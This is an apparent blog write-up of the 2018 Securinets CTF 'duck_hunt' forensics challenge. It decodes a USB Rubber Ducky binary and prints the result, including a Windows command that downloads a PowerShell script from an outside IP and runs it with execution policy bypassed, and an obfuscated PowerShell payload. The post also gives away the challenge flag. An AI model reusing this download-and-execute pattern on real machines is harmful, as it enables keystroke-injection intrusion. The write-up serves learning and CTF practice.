---
layout: post
title: "[2018_Securinets_CTF] duck_hunt(300)"
description:
headline:
modified: 2018-03-26
category: [CTF, 2018_Securinets]
tags: [Forensic, ducky]
imagefeature:
mathjax:
chart:
comments: true
featured: true
---


## Exercise

> Do you know someone who loves hunting ducks?
> Link: http://for.ctfsecurinets.com/8/unknown.bin

![](/images/2018-03-26-Securinets-CTF-duck-hunt-300/exercise.png)
<p align='center'>[그림] exercise</p>


## Solution

You can download a binary called "unknown.bin". After download the "unknown.bin", that is look like dummy binary.


you need to know "duck" in exercise. that is "ducky". ducky, which uses the mcu chip for usb and performs common operations, uses the result of the compilation "inject.bin".(more important : "https://hakshop.com/products/usb-rubber-ducky-deluxe")


below site, you can decode that binary. "https://ducktoolkit.com/decoder/"
![](/images/2018-03-26-Securinets-CTF-duck-hunt-300/decode.png)
<p align='center'>[그림] decode site</p>



After Binary file decode, you can see that original "ducky code".
![](/images/2018-03-26-Securinets-CTF-duck-hunt-300/decode_file.png)
<p align='center'>[그림] original ducky code</p>


This is ducky code. you can see "http://34.240.44.38/payload.txt" about "GET url".
```bash
DELAY
ADELAY
DELAY
DELAY
cd / & mkdir .haxor & cd .haxor & echo (curl -X GET  http://34.240.44.38/payload.txt) > file.PS1 & powershell -ExecutionPolicy ByPass -File file.ps1
DELAY

```

You can tell from the payload.txt that it is a powershell script, and seems to have a simple obfuscation. Nothing is a problem. This is "payload.txt" (powershell script)
```powershell
${;}=+$();
${=}=${;};
${+}=++${;};
${@}=++${;};
${.}=++${;};
${[}=++${;};
\n${]}=++${;};
${(}=++${;};
${)}=++${;};
${&}=++${;};
${|}=++${;};
${"}="["+"$(@{})"[${)}]+"$(@{})"["${+}${|}"]+"$(@{})"["${@}${=}"]+"$?"[${+}]+"]";
${;}="".("$(@{})"["${+}${[}"]+"$(@{})"["${+}${(}"]+"$(@{})"[${=}]+"$(@{})"[${[}]+"$?"[${+}]+"$(@{})"[${.}]);
${;}="$(@{})"["${+}${[}"]+"$(@{})"[${[}]
"${"}${.}${(}+${"}${+}${=}${@}+${"}${+}${=}${&}+${"}${|}${)}+${"}${+}${=}${.}+${"}${(}${+}+${"}${&}${@}+${"}${+}${=}${+}+${"}${|}${)}+${"}${+}${=}${=}+${"}${[}${]}+${"}${)}${@}+${"}${+}${+}${+}+${"}${+}${+}${]}+${"}${+}${+}${(}+${"}${.}${@}+${"}${[}${]}+${"}${&}${=}+${"}${+}${+}${[}+${"}${+}${+}${+}+${"}${+}${=}${|}+${"}${+}${+}${@}+${"}${+}${+}${(}+${"}${.}${@}+${"}${.}${|}+${"}${(}${|}+${"}${+}${+}${=}+${"}${+}${+}${(}+${"}${+}${=}${+}+${"}${+}${+}${[}+${"}${.}${@}+${"}${+}${+}${(}+${"}${+}${=}${[}+${"}${+}${=}${+}+${"}${.}${@}+${"}${+}${+}${@}+${"}${|}${)}+${"}${+}${+}${]}+${"}${+}${+}${]}+${"}${+}${+}${|}+${"}${+}${+}${+}+${"}${+}${+}${[}+${"}${+}${=}${=}+${"}${.}${|}+${"}${+}${.}+${"}${+}${=}+${"}${)}${.}+${"}${+}${=}${@}+${"}${[}${=}+${"}${+}${=}${@}+${"}${+}${=}${&}+${"}${|}${)}+${"}${+}${=}${.}+${"}${.}${@}+${"}${[}${]}+${"}${+}${=}${+}+${"}${+}${+}${.}+${"}${.}${@}+${"}${.}${|}+${"}${)}${=}+${"}${+}${=}${&}+${"}${|}${)}+${"}${+}${=}${.}+${"}${+}${@}${.}+${"}${+}${=}${]}+${"}${+}${+}${]}+${"}${|}${]}+${"}${|}${)}+${"}${|}${]}+${"}${+}${+}${[}+${"}${+}${+}${)}+${"}${|}${&}+${"}${|}${&}+${"}${+}${=}${+}+${"}${+}${+}${[}+${"}${|}${]}+${"}${+}${=}${=}+${"}${+}${+}${)}+${"}${|}${|}+${"}${+}${=}${)}+${"}${+}${@}${+}+${"}${|}${]}+${"}${+}${+}${)}+${"}${+}${+}${]}+${"}${+}${=}${+}+${"}${+}${=}${=}+${"}${|}${]}+${"}${+}${+}${]}+${"}${+}${+}${+}+${"}${+}${=}${|}+${"}${+}${=}${+}+${"}${+}${+}${|}+${"}${+}${=}${[}+${"}${+}${=}${+}+${"}${+}${+}${[}+${"}${+}${=}${+}+${"}${.}${.}+${"}${+}${@}${]}+${"}${.}${|}+${"}${[}${+}+${"}${+}${@}${.}+${"}${+}${.}+${"}${+}${=}+${"}${|}+${"}${&}${)}+${"}${+}${+}${[}+${"}${+}${=}${]}+${"}${+}${+}${(}+${"}${+}${=}${+}+${"}${[}${]}+${"}${)}${@}+${"}${+}${+}${+}+${"}${+}${+}${]}+${"}${+}${+}${(}+${"}${.}${@}+${"}${.}${|}+${"}${)}${+}+${"}${+}${+}${+}+${"}${+}${+}${+}+${"}${+}${=}${=}+${"}${.}${@}+${"}${)}${[}+${"}${+}${+}${+}+${"}${|}${&}+${"}${.}${.}+${"}${.}${|}+${"}${]}${|}+${"}${+}${.}+${"}${+}${=}+${"}${|}+${"}${&}${)}+${"}${+}${+}${[}+${"}${+}${=}${]}+${"}${+}${+}${(}+${"}${+}${=}${+}+${"}${[}${]}+${"}${)}${@}+${"}${+}${+}${+}+${"}${+}${+}${]}+${"}${+}${+}${(}+${"}${.}${@}+${"}${.}${[}+${"}${.}${(}+${"}${+}${=}${@}+${"}${+}${=}${&}+${"}${|}${)}+${"}${+}${=}${.}+${"}${.}${[}+${"}${+}${.}+${"}${+}${=}+${"}${+}${@}${]}"
```


Unpacking is simple. Just run it in powershell as it's written in payload.
![](/images/2018-03-26-Securinets-CTF-duck-hunt-300/run.png)
<p align='center'>[그림] powershell run</p>

If "[CHar]" type values are output, the user can get the input value and check the comparison code. Within that code we can get the flag.

![](/images/2018-03-26-Securinets-CTF-duck-hunt-300/type.png)
<p align='center'>[그림] result of run</p>

```bash
$flag = Read-Host-Prompt 'Enter the password'
If (flag -eq 'Flag{is_a_rubber_ducky_used_somewhere!}'
```
![](/images/2018-03-26-Securinets-CTF-duck-hunt-300/flag.png)
<p align='center'>[그림] flag</p>


<p align='right'><strong>Flag{is_a_rubber_ducky_used_somewhere!}</strong></p>
